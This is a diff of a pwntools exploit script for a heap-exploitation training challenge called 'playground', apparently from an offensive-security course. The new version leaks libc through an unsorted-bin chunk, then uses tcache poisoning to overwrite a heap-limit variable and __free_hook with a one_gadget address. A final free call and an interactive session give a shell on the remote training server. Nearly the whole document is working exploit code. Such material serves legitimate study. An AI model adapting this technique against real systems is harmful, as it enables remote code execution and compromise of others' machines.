@@ -1,51 +1,113 @@
 from pwn import*
 
-r = process("./playground")
-#r = remote("bin.training.offdef.it", 10101)
+#r = process("./playground")
+r = remote("bin.training.offdef.it", 4110)
 
-gdb.attach(r,
-'''
-b *(main+243)
-''')
+
+def malloc(size):
+    r.sendline(b"malloc " + str(size).encode())
+    temp = r.recvline()[4:].strip()
+    addr = int(temp, 16)
+    r.recvuntil(b"> ")
+    log.info("malloc: " + hex(addr))
+    return addr
+
+
+def free(addr):
+    r.sendline(b"free " + hex(addr).encode())
+    r.recvline()
+    r.recvuntil(b"> ")
+    log.info("free: " + hex(addr))
+
+
+def show(addr, n=1, from_idx=0):
+    r.sendline(b"show " + hex(addr).encode() + b" " + str(n + from_idx).encode())
+    for i in range(from_idx):
+        r.recvline()
+    data = b""
+    for i in range(n):
+        r.recvuntil(b": ")
+        temp = r.recvline().strip()
+        log.info("show: " + hex(addr + i * 8) + " " + str(temp))
+        data += temp
+    r.recvuntil(b"> ")
+    return data
+
+
+def write(addr, data):
+    r.sendline(b"write " + hex(addr).encode() + b" " + str(len(data) + 1).encode())
+    line = r.recvline()
+    if b"fail" in line:
+        log.error("write failed")
+    else:
+        r.sendline(data)
+        r.recvline()
+    r.recvuntil(b"> ")
+    log.info("write: " + hex(addr) + " " + str(data) + " " + str(len(data)))
 
 input("wait")
-
-def malloc(n):
-	r.sendline(b"malloc " + bytes(str(n),encoding="utf-8"))
-	r.recvuntil(b"==> ")
-	pointer = r.recv()[:-1]
-	return pointer
-
-def free(pointer):
-	r.sendline(b"free " + pointer)
-	r.recv()
-
-def write(pointer,n,what_to_write):
-	r.sendline(b"write " + pointer + b" " + bytes(str(n),encoding="utf-8"))
-	r.send(what_to_write)
-	r.recv()
 
 r.recvuntil(b"main: ")
-app = r.recv()[:-3]
-main_address = int(app,16)
+main = int(r.recvuntil(b"\n")[:-1], 16)
+print(hex(main))
 
-print("PROVA -> stampa main address")
-print(hex(main_address))
+r.recvuntil(b"> ")
+
+bss_max_heap_offset = 0x2EC7
+arbitrary_chunk_max_heap_addr = main + bss_max_heap_offset
+
+unsorted_chunk = malloc(0x600)
+malloc(0x20)
+free(unsorted_chunk)
+
+appogggio = show(unsorted_chunk, 0x1)
+print(appogggio)
+leaked_libc = int(appogggio, 16)
+
+libc_base_offset = 0x3EBCA0
+libc_base = leaked_libc - libc_base_offset
+
+gadget = libc_base + 0x4f302
+
+print("leaked libc, gadget address :", hex(gadget))
+
+chunk1 = malloc(0x60)
+chunk2 = malloc(0x60)
+
+print("PRINT CHUNK1:")
+print(chunk1)
+
+free(chunk1)
+free(chunk2)
+
+write(chunk2, p64(arbitrary_chunk_max_heap_addr))
+
+malloc(0x60)
+arbitrary_chunk_max_heap = malloc(0x60)
+
+print("rewriting max heap value")
+
+write(arbitrary_chunk_max_heap, p64(0xfffffffffffff000))
+
+free(chunk1)
+free(chunk2)
+
+free_hook_offset = 0x3ED8E8
+free_hook_address = libc_base + free_hook_offset
+
+write(chunk2, p64(free_hook_address))
+
+malloc(0x60)
+arbitrary_chunk_malloc_hook = malloc(0x60)
+
+write(arbitrary_chunk_malloc_hook, p64(gadget))
+
+print("last free to call free hook")
+
+r.sendline(b"free " + hex(chunk1).encode())
 
 
-c1 = malloc(0x8)
-c2 = malloc(0x8)
-
-print("malloc fatte")
-
-free(c1);
-free(c2);
-
-print("free fatte")
-
-input("wait")
-write(c1, 0x8, b"A"*8)
-print("write fatta")
+#r.sendline(b"aaa")
 
 
 r.interactive()
